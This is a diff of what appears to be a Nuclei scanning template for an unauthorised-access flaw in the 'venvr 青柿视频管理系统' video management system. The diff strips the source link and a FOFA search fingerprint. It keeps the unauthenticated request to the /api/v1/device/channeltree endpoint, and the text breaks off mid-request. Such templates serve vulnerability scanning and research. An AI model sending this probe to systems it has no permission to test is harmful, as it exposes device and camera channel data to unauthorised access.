@@ -3,12 +3,8 @@ info:
   name: venvr 青柿视频管理系统 channeltree 未授权访问漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/sl32oz3ccvwgqs70'
+  description: ''
   tags: unauth,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: sl32oz3ccvwgqs70
-    fofa: body="js/liveplayer-lib.min.js" && body="css/index"
 http:
 - raw:
   - 'GET /api/v1/device/channeltree?serial=&pcode HTTP/1.1
